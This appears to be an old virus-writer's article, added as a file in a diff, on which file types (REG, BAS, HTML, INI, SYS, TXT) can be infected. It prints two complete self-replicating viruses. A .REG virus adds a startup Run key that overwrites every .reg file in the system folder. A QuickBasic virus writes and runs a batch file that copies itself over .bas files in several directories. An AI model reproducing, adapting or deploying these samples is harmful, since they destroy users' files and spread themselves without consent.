@@ -1,0 +1,90 @@
+				Which Files can be infected?
+
+Everbody knows, that .EXE, .COM, .VBS or .DOC files are potential victims from a virus, but whats with the many other files like .REG, .INI, .HTM(L), .TXT or .BAS?
+
+I try to answer this question in this article:
+
+
+
+REG Files:
+Every .REG file writes a key to the Registry, if they are execute. Much viriis use this for open itself at every start from the computer.
+But is it possible to infect a .REG file with a own REG-infector virus? The answer is yes, because the registry is able to execute DOS commands. Here is a code from a WinREG virus:
+
+REGEDIT4
+
+;;-------------------------------;;
+;; ;;
+;; AntiREG (The First REG Virus) ;;
+;; Coded By Lys Kovick ;;
+;; Special Thanks To Phage ;;
+;; ;;
+;;-------------------------------;;
+
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\]
+@="command /c for %i in (%windir%\\system\\*.reg) do regedit /e %i HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
+
+How works this virus? It write a key to the start-up registry. Because of that the next command will be execute every start of the computer. The next line search for every .REG file in the system-folder from windows and overwrite they with the code from the path wich is mentioned there. This path is the virus, so every .REG file will be overwrite wit the virus. This viriis wont spread much because nobody will copy a .REG file. But it shows, that .REG files can be infected. ;-)
+
+
+
+Sourec-code Files:
+This files are for instands .CPP files(C++), .PAS(Pascal) or .BAS (QuickBasic)
+I have written a sourec code infector, because I didnt know, that it is possible to manage:
+
+CLS
+REM The first Quick Basic infection Virus
+REM written by SeCoNd PaRt To HeLl
+REM for showing, that .BAS can be infected
+REM NAME of the Virus: BAS.XYC
+OPEN "C:\xyc.bat" FOR OUTPUT AS #1
+PRINT #1, "@echo off"
+PRINT #1, "if exist xyc.bas copy xyc.bas C:\xyc.bas"
+PRINT #1, "for %%r in (*.bas ..\*.bas %windir%\*.bas) do copy C:\xyc.bas %%r"
+CLOSE #1
+SHELL "C:\xyc.bat"
+
+This virus infects only QuickBasic sourec codes. If the infect sourec is execute, it will made a file named XYC.BAT at the path C:\. This file will be execute by the virus. If any file named xyc.bas, the batch file copies it to the path C:\xyv.bas. Then it search for every .BAS file in the current, parent and windows directory and copy the virus (C:\xyv.bas) to the files. If any infected file is execute, the virus will infect other files too, because the file xyc.bas wasnt delete. This virus wont spread often, because the the virus can overwrite files only, if the file xyv.bas is on the PC. 
+
+
+
+HTM(L) Files:
+HTML files can be infected. The reason for that is, that .HTM or .HTML can execute scripts like Visual Basic Script or Java Script. Here is a little sourec of the code from a .html virus:
+
+
+<html>
+
+<body>
+
+<script language="VBScript">
+
+ . . . Script Code . . .
+
+</script>
+
+</body>
+
+</html>
+
+Because of that, .HTM file are able to spread with Outlook eMails or IRC (mIRC, pIRCh, vIRC, KvIRC)
+
+
+
+INI Files:
+I dont really know about it, but I think it must be possible. If any program execute a .INI file, that is infect, the .INI file could copy to the WIN.INI or SYSTEM.INI file, so the .INI file will be loaded every start of the computer. Then it could search for all .INI files from the computer and overwrite they with itself. If any program, which use a infected .INI file, will be copied to an other computer, the virus could spread. But I think, it is more work than success
+
+
+
+SYS files:
+Its the same as the .INI files, because .SYS files cant be execute by the user.
+The virus must infect the CONFIG.SYS file, then try to infect other .SYS files, and if any program, use an infected .SYS file, will be copied, the virus can spread to other computers.
+
+
+
+.TXT files:
+No, its not possible to write a .TXT file virus. But if you write an .EXE virus, you can infect the NOTEPAD.EXE file, so the virus will start, if any .TXT file is execut But this isnt a really textfile virus.
+
+
+I hope you joined to read the article...
+
+Greets, 
+SeCoNd PaRt To HeLl
